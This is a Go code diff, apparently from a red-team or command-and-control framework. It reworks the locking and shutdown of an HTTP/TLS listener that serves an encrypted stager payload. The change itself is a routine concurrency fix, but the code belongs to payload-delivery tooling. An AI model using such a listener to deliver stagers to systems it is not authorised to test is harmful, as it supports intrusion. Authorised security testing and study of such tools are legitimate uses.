@@ -6,6 +6,7 @@ import (
 	"fmt"
 	"net/http"
 	"sync"
+	"time"
 )
 
 var (
@@ -17,12 +18,16 @@ var (
 // port, replacing any previously running server. The returned server is ready
 // to be started with ListenAndServe (plain HTTP) or ListenAndServeTLS.
 func newStagerServer(stager_enc []byte, port string) *http.Server {
+	// Detach the previous server under the lock but shut it down after
+	// unlocking: Shutdown waits for in-flight requests, and the AGENTS rules
+	// forbid holding a lock during network I/O.
 	httpServerMu.Lock()
-	if server != nil {
-		listenerLogf("Shutting down existing server on port %s", server.Addr)
-		if err := server.Shutdown(context.TODO()); err != nil {
-			listenerLogf("Error shutting down server: %v", err)
-		}
+	previous := server
+	server = nil
+	httpServerMu.Unlock()
+	if previous != nil {
+		listenerLogf("Shutting down existing server on port %s", previous.Addr)
+		shutdownHTTPServer(previous)
 	}
 
 	mux := http.NewServeMux()
@@ -34,12 +39,24 @@ func newStagerServer(stager_enc []byte, port string) *http.Server {
 		listenerLogf("Served encrypted stager to %s", r.RemoteAddr)
 	})
 
-	server = &http.Server{
+	srv := &http.Server{
 		Addr:    fmt.Sprintf(":%s", port),
 		Handler: mux,
 	}
+	httpServerMu.Lock()
+	server = srv
 	httpServerMu.Unlock()
-	return server
+	return srv
+}
+
+// shutdownHTTPServer asks srv to drain and stop. The timeout bounds the wait so
+// a client that keeps a connection open cannot wedge the listener forever.
+func shutdownHTTPServer(srv *http.Server) {
+	ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
+	defer cancel()
+	if err := srv.Shutdown(ctx); err != nil {
+		listenerLogf("Error shutting down server: %v", err)
+	}
 }
 
 // serveStager serves the encrypted stager file over plain HTTP.
@@ -87,13 +104,15 @@ func HTTPListenerTLS(stagerPath, port, keyStr string, tlsConfig *tls.Config) err
 
 // StopHTTP stops the HTTP server.
 func StopHTTP() {
+	// Detach under the lock, then shut down without it (network I/O must never
+	// run while holding httpServerMu).
 	httpServerMu.Lock()
-	defer httpServerMu.Unlock()
-	if server != nil {
-		listenerLogf("Shutting down HTTP server on %s", server.Addr)
-		if err := server.Shutdown(context.TODO()); err != nil {
-			listenerLogf("Error shutting down HTTP server: %v", err)
-		}
-		server = nil
+	srv := server
+	server = nil
+	httpServerMu.Unlock()
+	if srv == nil {
+		return
 	}
+	listenerLogf("Shutting down HTTP server on %s", srv.Addr)
+	shutdownHTTPServer(srv)
 }
